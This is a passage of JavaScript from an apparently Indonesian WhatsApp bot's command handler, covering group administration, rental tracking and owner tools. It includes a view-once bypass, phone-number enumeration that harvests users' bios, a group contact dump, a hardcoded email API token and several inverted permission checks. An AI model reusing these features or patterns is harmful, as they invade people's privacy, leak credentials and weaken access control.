mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
znn.groupParticipantsUpdate(from, mems, 'promote')
break
case 'promote': case 'pm':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
znn.groupParticipantsUpdate(from, [froms], 'promote').then(res => {
znn.sendMessage(from, {text: `Sukses menjadikan @${froms.split('@')[0]} sebagai admin`, mentions: [froms]}, {quoted:m})
}).catch(() => reply(m.error.api))
break //Powered By znn & znn
case 'demote': case 'dm':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
if (froms == global.owner || froms == botNumber) return reply(`Tidak bisa demote ${froms == global.owner ? 'creator saya' : 'bot'}!`)
znn.groupParticipantsUpdate(from, [froms], 'demote').then(res => {
znn.sendMessage(from, {text: `Sukses menjadikan @${froms.split('@')[0]} sebagai member biasa`, mentions: [froms]}, {quoted:m})
}).catch(() => reply(m.error.api))
break //Powered By znn & znn
case 'add':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply("Balas pesan atau masukan nomor target!")
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
var cek = await znn.onWhatsApp(froms)
if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
let add = await znn.groupParticipantsUpdate(from, [froms], "add")
Object.entries(add).map(([_, v]) => {
if (v.status === '403'){
reply(`Gagal menambahkan peserta dengan alasan: *Diprivate oleh yang bersangkutan*`)
} else if (v.status === '409'){
reply('Orang yang anda add sudah berada didalam Grup!')
} else if (v.status === '408'){
reply(`Gagal menambahkan peserta dengan alasan: *Dia baru keluar group baru baru ini*`)
} else if (v.status === '401'){
reply(`Gagal menambahkan peserta dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else reply(`Sukses menambahkan member`)
})
break //Powered By znn & znn
case 'kick':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
if (!froms) return reply(`Tag atau balas pesan orang yang ingin di keluarkan!`)
if (froms == global.owner || froms == botNumber) return reply(`Tidak bisa kick ${froms == global.owner ? 'creator saya' : 'bot'}!`)
var data = await znn.groupParticipantsUpdate(from, [froms], "remove")
for (let ryaa of data) {
if (ryaa.status === '406'){
reply(`Gagal kick member dengan alasan: *Dia yang membuat grup ini*`)
} else {
reply('Sukses kick member')
znn.imgToSticker(from, fs.readFileSync('./assets/sticker/kick.jpg'), m, {packname: packname, author: global.author})
}
}
break //Powered By znn & znn
case 'groupinfo': case 'infogrup':
case 'infogroup': case 'infogc':{
if (!isGroup) return onlyGc()
try {
let meta = await (await znn.groupMetadata(m.chat))
let admin = meta.participants.filter(p => p.admin)
let listAdmin = admin.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let pic = await getBuffer(await znn.profilePictureUrl(m.chat, 'image').catch(_ => ppnyauser))
let caption = `乂  *G R O U P - I N F O*\n
◦  *Name* : ${meta.subject}
◦  *ID* : ${meta.id}
◦  *Owner* : ${meta.owner ? '@' + meta.owner.split('@')[0] : m.chat.match('-') ? '@' + m.chat.split('-')[0] : ''}
◦  *Created* : ${moment(meta.creation * 1000).format('DD/MM/YY HH:mm:ss')}
◦  *Member* : ${meta.participants.length}
◦  *Admin* : ${admin.length}
◦  *Kirim pesan* : ${meta.announce ? 'Hanya admin' : 'Semua peserta'}
◦  *Edit info grup* : ${meta.restrict ? 'Hanya admin' : 'Semua peserta'}
◦  *List Admin* :\n${listAdmin}\n
◦  *Deskripsi grup* :\n${meta.desc}`.trim()
sendMessageModify(m.chat, caption, m, {
thumbUrl: ppnyauser, 
largeThumb: true, 
thumbnail: pic
})
} catch (e) {
console.log(e)
znn.sendteks(m.chat, util.format(e), m)
}
}
break //Powered By znn & znn
case 'linkgrup': case 'linkgc':
if (!isGroup) return onlyGc()
if (!isBotAdmins) return botAdmin()
var url = await znn.groupInviteCode(from).catch(() => reply(m.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break //Powered By znn & znn
case 'timergc':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return onlyAdmin()
if (!isBotAdmins) return botAdmin()
let timergc = "PILIH WAKTU RESET CHAT"
znn.sendPoll(from, timergc, [`24 jam`,`7 hari`,'90 hari','mati'])
break
case '24':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
znn.groupToggleEphemeral(m.chat, 1*24*3600)
reply('Timer di set ke 24 jam')
break
case '7':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return Cuekin
if (!isBotAdmins) return botAdmin()
znn.groupToggleEphemeral(m.chat, 7*24*3600)
reply('Timer di set ke 7 hari')
break
case '90':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return Cuekin
if (!isBotAdmins) return botAdmin()
znn.groupToggleEphemeral(m.chat, 90*24*3600)
reply('Timer di set ke 90 hari')
break
case 'mati':
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
znn.groupToggleEphemeral(m.chat, 0*24*3600)
reply('Timer telah di matikan')
break
case 'grup': case 'gc': {
if (!isGroup) return onlyGroup()
if (!isAdmins && !isOwner) return !0;
if (!isBotAdmins) return botAdmin()
if (args[0] === 'close'){
await znn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`*GROUP TELAH DI TUTUP!*`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await znn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`*GROUP TELAH DI BUKA!*`)).catch((err) => m.reply(jsonformat(err)))
} else {
wiwin1 = "Choose The Poll"
await delay(500)
await znn.sendPoll(from, wiwin1, [`grup open`,`grup close`])
 }
}
break // Powered By Winn
case'delsampah':{
let directoryPath = path.join('./.npm') //&& './assets') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./.npm/${file}`) //&& `./assets/${file}`) 
});
await delay(2000)
reply("Berhasil menghapus semua sampah")
});
}
break // Powered By Winn

case 'revoke':
if (!isGc) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
await znn.groupRevokeInvite(from).then(res => {reply(`Sukses menyetel ulang tautan grup!\nTautan baru: https://chat.whatsapp.com/${res}`)}).catch(() => reply(m.error.api))
break //Powered By znn & znn
case 'left': 
{
if (!isCreator) return reply('upps tidak bisa (´-﹏-`；)')
znn.groupLeave(m.chat)
reply('Babayo...')
}
break //Powered By znn & znn
case 'getlinkgc': case 'getlinkgroup': case 'getlinkgrup':{
if (!isCreator) return onlyOwner()
if (!text) return reply('```ID GC NYA MANA?```')
let getlinkgc = await znn.groupInviteCode(text).catch((err) => reply('```BOT BUKAN ADMIN DI GC TERSEBUT [!]```'))
reply(`https://chat.whatsapp.com/${getlinkgc}\n\n`)
}
break
case 'setppgc': {
if (!isCreator && !isOwner) return onlyOwner()
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await znn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await znn.query({
tag: 'iq',
attrs: {
to: from,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
} else {
var memeg = await znn.updateProfilePicture(from, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses\n\n`)
}
}
break
case 'setgrupname': case 'gcname':
if (!isGc) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
if (!q) return reply(`Gunakan dengan cara ${comand} *text*\n\n_Contoh_\n\n${comand} Support ${ownerName}`)
await znn.groupUpdateSubject(from, q).then(res => {reply(m.ok)}).catch(() => reply(m.error.api))
break //Powered By znn & znn
case 'setdesc':
if (!isGc) return onlyGc()
if (isAdmins && !isOwner) return onlyAdmin()
if (isBotAdmins) return botAdmin()
if (!q) return reply(`Gunakan dengan cara ${comand} *text*\n\n_Contoh_\n\n${comand} New Description by ${global.ownerName}`)
await znn.groupUpdateDescription(from, q).then(res => {reply(m.ok)}).catch(() => reply(m.error.api))
break //Powered By znn & znn
case 'sewabot':
let txse = `Please contact the ownet`
reply(txse)
break
case 'listsewa':
let list_sewa_list = `*LIST SEWA GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
    list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
    if (x.expired === 'PERMANENT') {
        let ceksewa = 'PERMANENT'
        list_sewa_list += `*Expire :* PERMANENT\n\n`
    } else {
        let ceksewa = ms(x.expired - Date.now())
        list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
    }
}
znn.sendMessage(from, { text: list_sewa_list }, { quoted: m })
break
case 'checksewa': case 'ceksewa':
if (!isGroup) return reply('Only group')
if (!isSewa) return reply(`Bot tidak di sewa group ini!`)
let ceksewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
reply(sewanya)
break
case 'addsewa':
if (!isOwner && !isCreator) return reply('Only owner')
if (args.length < 2) return reply(`Gunakan dengan cara ${command} *link waktu*\n\nContoh : ${command} https://chat.whatsapp.com/Hjv5qt195A2AcwkbswwoMQ 30d`)
if (!isUrl(args[1])) return reply('Harus berupa link')
var url = args[1]
url = url.split('https://chat.whatsapp.com/')[1]
if (!args[2]) return reply(`Waktunya?`)
var data = await sock.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return reply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[2], sewa)
reply(`Success Add Sewa Group!`)
break
case 'delsewa':
if (!isOwner && !isCreator) return reply('Only owner')
if (!isGroup) return onlyGroup()
if (!isSewa) return reply(`Bot tidak disewa di Grup ini`)
sewa.splice(_sewa.getSewaPosition(args[1] ? args[1] : from, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
reply(`Sukses`)
break






























// FITUR OWNER

case 'warcall': {
if (!isCreator && !isOwner) return reply('only winn')
if (!text) return reply(`Example : ${prefix + command} Open VCS`)
var call = { 
scheduledCallCreationMessage: {
callType: 0,
scheduledTimestampMs:  Date.now(),
title: `${text}`
}}
znn.relayMessage(m.chat, call, {})
}
break
case 'auto-ai': case 'autoai':
if (!isCreator) return reply("Dibuat untuk owner")
if (args[0] == 'on'){
global.autoTyping = true
reply('Nobara auto ai telah aktif')
} else if (args[0] == 'off'){
global.autoTyping = false
reply('Auto AI dimatikan, jangan lupa donasi owner')
} else reply('on / off')
break
case 'public': case 'publik':
if (!isCreator && !isOwner && !isPremium) return reply(mess.OnlyPrem)
if (global.self) return reply('*[ System Notice ]* public mode *on*')
global.self = true
reply('*[ System Notice ]* success change mode')
break //Powered By znn & znn
case 'self': case 'modeself':
if (!isCreator && !isOwner && !isPremium) return reply(mess.OnlyPrem)
if (!global.self) return reply('*[ System Notice ]* sudah aktif')
global.self = false
reply('*[ System Notice ]* success change mode')
break
case 'autoreject': case 'anticall':
if (!botNumber) return onlyOwner()
if (args[0] == 'on'){
if (global.autoreject) return reply('UDAH ON!')
global.autoreject = true
reply('Fitur auto reject telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.autoreject) return reply('UDAH OFF!')
global.autoreject = false
reply('Fitur auto reject telah di matikan')
} else reply('on / off')
break
case 'onlypc':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.onlypc) return reply('udah on!')
global.onlypc = true
reply('sukses only private chat')
} else if (args[0] == 'off'){
if (!global.onlypc) return reply('sudah dimatikan sebelumnya!')
global.onlypc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By znn & znn
case 'onlygc':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.onlygc) return reply('udah on!')
global.onlygc = true
reply('sukses only group chat')
} else if (args[0] == 'off'){
if (!global.onlygc) return reply('sudah dimatikan sebelumnya!')
global.onlygc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By znn & znn
case 'antilink':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.antilink) return reply('UDAH ON!')
global.antilink = true
reply('Fitur antilink telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antilink) return reply('UDAH OFF!')
global.antilink = false
reply('Fitur antilink telah di matikan')
} else reply('on / off')
break //Powered By znn & znn
case 'antibot':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.antibot) return reply('UDAH ON!')
global.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antibot) return reply('UDAH OFF!')
global.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('on / off')
break //Powered By znn & znn
case 'autodownload':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break //Powered By znn & znn
case 'autoreadsw': case 'autoread':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
if (global.autoreadsw) return reply('UDAH ON!')
global.autoreadsw = true
reply('Fitur auto read sw telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.autoreadsw) return reply('UDAH OFF!')
global.autoreadsw = false
reply('Fitur auto read sw telah di matikan')
} else reply(`gunakan dengan ${prefix}${command} on / off`)
break
case "createqr": {
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} znn Sayang`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
znn.sendMessage(from, { image: data, caption: `Nih Qr Codenya, reply dengan pesan *.detectqr* untuk mendeteksi text yang sudah dibuat menjadi Qr` }, { quoted: m })
}
break
case "detectqr":
if (/image\/(jpe?g|png)/.test(mime)) {
try {
mee = await znn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res123 = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res123.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'banned': case 'ban':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (db.users[froms].banned) return reply('Udah banned!')
db.users[froms].banned = true
reply(`Berhasil banned *${db.users[froms].name}*`)
} else reply('Tag atau reply pesan target!')
break
case 'unbanned': case 'unban':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].banned) return reply('Udah unbanned!')
db.users[froms].banned = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar banned`)
} else reply('Tag atau reply pesan target!')
break
case 'addprem':
if (!isCreator&&!isOwner) return reply(mess.OnlyPrem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (db.users[froms].premium) return reply('Udah premium!')
db.users[froms].premium = true
reply(`Berhasil premium *${db.users[froms].name}*`)
} else reply('Tag atau reply pesan target!')
break
case 'delprem':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (m.quoted || q) {
if (!(froms in db.users)) return reply('User tidak terdaftar didalam DATABASE!')
if (!db.users[froms].premium) return reply('Belom premium!')
db.users[froms].premium = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar premium`)
} else reply('Tag atau reply pesan target!')
break
case 'setprefix':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (!q) return reply(`Contoh: ${comand} #`)
if (global.prefix == args[0]) return reply('Prefixnya udah itu kocak!')
global.prefix = args[0]
reply(`Prefix successfully changed to : ${args[0]}`)
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (isBotAdmins) return reply('adminkan botnya')
await znn.removeProfilePicture(from)
}
break
case 'deleteppbot': case 'delppbot': {
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
await znn.removeProfilePicture(znn.user.id)
replygcxeon(`Success in deleting bot's profile picture`)
}
break
case 'setpp': case 'setppbot':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (!isImage || isQuotedImage) {
if (args[0] == 'full' || args[0] == 'panjang'){
var media = await znn.downloadAndSaveMediaMessage(quoted, pw)
await znn.createprofile(botNumber, media)
reply('suksess')
} else {
var media = await znn.downloadAndSaveMediaMessage(quoted, pw)
var data = await znn.updateProfilePicture(botNumber, { url: media })
reply(m.ok)
}
} else reply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
break
case 'blok': case 'block':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (!froms) return reply(`Tag atau reply pesan target!`)
znn.updateBlockStatus(froms, 'block')
reply('Sukses block target')
break
case 'unblok': case 'unblock':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (!froms) return reply(`Tag atau reply pesan target!`)
znn.updateBlockStatus(froms, 'unblock')
reply('Sukses unblock target')
break
case 'listblock':
let listblok = await znn.fetchBlocklist()
reply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'delchat':
if (!isCreator && !isOwner) return onlyOwner()
await znn.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply('sukses menghapus chat')
break
case 'readvo': case 'rvo': {
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await znn.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await znn.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await znn.downloadAndSaveMediaMessage(quoted)
znn.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await znn.downloadAndSaveMediaMessage(quoted)
znn.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break











case 'jontol':
if (!isCreator&&!isPremium) return reply(mess.OnlyPrem)
if (args[0] == 'on'){
reply('jontol')
} else if (args[0] == 'off'){
reply('memes')
} else reply('on / off')
break //Powered By znn & znn














// FITUR TOOLS
case 'shortlink':
if (!text) return reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) throw `*Error: Could not generate a short URL.*`;
let done = `*[ S U C C E S S   P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
reply795(done);
break
case "adduserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
if (global.db.users[froms] !== undefined) return m.reply('User telah terdaftar di database!')
global.db.users[froms] = {
register: true,
name: '-',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
var jeje = `@${froms.split('@')[0]} Telah Terdaftar Ke Database Bot\nSekarang anda Bisa melihatnya di *.listdbuser*`
await reply795(jeje)
} 
break
case 'adduserdbgc':{
if (!isCreator) return
if (m.isGroup) {
const user = participants.map(v => v.id)
for (let u of user) {
if (db.users[u] == undefined) {
db.users[u] = {
name: '',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
}
}
let teks_adduser = `Sukses menambahkan ${user.length} kedalam database!`
await znn.sendteks(m.chat, teks_adduser, fpayment2)
} else if (text) {
if (!text.endsWith('@g.us')) return m.reply('Masukkan id grup dengan benar!')
try {
let meta = await winn.groupMetadata(text).catch(_ => {})
let user = meta.participants.map(v => v.id)
for (let u of user) {
if (db.users[u] == undefined) {
db.users[u] = {
name: '',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
}
}
let teks_adduser = `Sukses menambahkan ${user.length} kedalam database!`
await znn.sendteks(m.chat, teks_adduser, fkontak)
} catch (err) {
reply(util.format(err))
}
} else reply(`Masukkan id grup!\nContoh: ${prefix+command} 6288239620884-1626256984@g.us`)
}
break
case 'listdbuser':
if (!isCreator) return reply(mess.owner)
let listdbuser = Object.entries(db.users).map(([key, value]) => {return {...value, jid: key}})
let sortedbalance1 = listdbuser.map(toNumber('limit')).sort(sort('limit'))
let usersbalance1 = sortedbalance1.map(enumGetKey)
ppo = `Kamu Top *${usersbalance1.indexOf(sender) + 1}* Limit dari *${usersbalance1.length}* global user

${sortedbalance1.slice(0, 10).map(({ jid, balance }, i) => `${i + 1}. @${jid.split('@')[0]} => ${formatNumber(limit)}`).join`\n`}`
reply795(ppo)
break
case "deluserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
delete db.users[froms]
peeee = `Berhasil Menghapus @${froms.split('@')[0]} Dari Database User`
reply795(peeee)
}
break
case 'npms': case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	znn.sendMessage(m.chat, {
		react: {
			text: '⚙️',
			key: m.key,
		}
	})
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	reply795(`乂 *N P M  S E A R C H*\n\n` + txt)
}
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner && !isCreator) return reply(mess.admin)
konstak = await znn.sendMessage(m.chat, {
    text: `Group : *${groupMetadata.subject}*\nMember : *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
znn.sendContact(m.chat, participants.map(a => a.id), konstak)
}
break
case 'shutdown':
if (!isCreator && !isOwner) return reply(mess.owner)
reply(`znn dimatikan`)
await loading()
process.exit()
break
case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply795(`${meg.result}`)
}
break
case 'addowner':
if (!isCreator) return reply(mess.owner)
if (m.quoted || q) {
if (db.users[froms] == undefined) return reply795('User tidak terdaftar didalam database!')
if (db.users[froms].owner) return reply795('Udah owner!')
db.users[froms].owner = true
db.users[froms].balance += 500
reply(`*${db.users[froms].name}* Sekarang bisa mengakses fitur creator`)
reply(`Berhasil add owner *${db.users[froms].name}*`)
} else reply795('Tag atau reply pesan target!')
break
case 'delowner':
if (!isCreator) return
if (m.quoted || q) {
if (db.users[froms] == undefined) return reply795('User tidak terdaftar didalam database!')
if (!db.users[froms].owner) return reply('Belom owner!')
db.users[froms].owner = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar owner`)
} else reply('Tag atau reply pesan target!')
break
case 'listowner': 
let uowner = Object.entries(db.users).filter(uowner => uowner[1].owner).map(([key, value]) => {return { ...value, jid: key }})
let sortedowner = uowner.map(toNumber('owner')).sort(sort('owner'))
reply795(`*LIST USER OWNER*\nTotal : *${uowner.length}*
${sortedowner.map(({ jid, name }, i) => `\n*▸ ID:* @${jid.split('@')[0]}\n*▸ Name:* ${name}`).join`\n`}`.trim())
break
case 'nomor-wa': case 'nowa': {
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMOR WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var xanu = await znn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var xanuu = xanu.length !== 0 ? xanu : false
try {
try {
var xanu1 = await znn.fetchStatus(xanu[0].jid)
} catch {
var xanu1 = '401'
}
if (xanu1 == '401' || xanu1.status.length == 0) {
no_bio += `wa.me/${xanu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${xanu[0].jid.split("@")[0]}\nBiography : ${xanu1.status}\nDate : ${moment(xanu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator && !isOwner && !isPremium) return reply('Khusus Sepuh (っ˘̩╭╮˘̩)っ')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await znn.groupCreate(args.join(" "), [])
let response = await znn.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
reply795(teks2)
} catch {
reply("Error!")
}
}
break
case 'delfolder':
if (!isCreator) return reply(global.mess.owner)
if (!text) return reply795(`* Example* : ${prefix + command} userclone/session`)
rimraf.sync(`./${text}`)
reply(`Berhasil hapus folder ${q}`)
break
case 'gfl': case "gantifile":{
if (!isCreator) return reply(global.mess.owner)
if (!text.includes("./")) return reply795(`* Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
reply(`Mengupload`)
await delay(2000)
reply(`Berhasil mengganti file ${q}`)
}
break
case 'restart':
if (!isCreator) return reply(global.mess.owner)
await loading()
process.send('reset')
break
case 'mail':
      if (!args || !args[0]) return reply(` *Example :* .${command} ${global.email}`)
      await znn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})     
      if (!/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/ig.test(args[0])) return znn.reply(m.chat, '```🚩 Email Tidak Ada, Harap Gunakan Email Asli !```', m)
      users.email = args[0]
        await fetch("https://send.api.mailtrap.io/api/send/", {
                method: "POST",
                headers: {
                    "Authorization": "Bearer 46fae2154055e6df3901c95919531b2a",
                    "Content-Type": "application/json"
                },
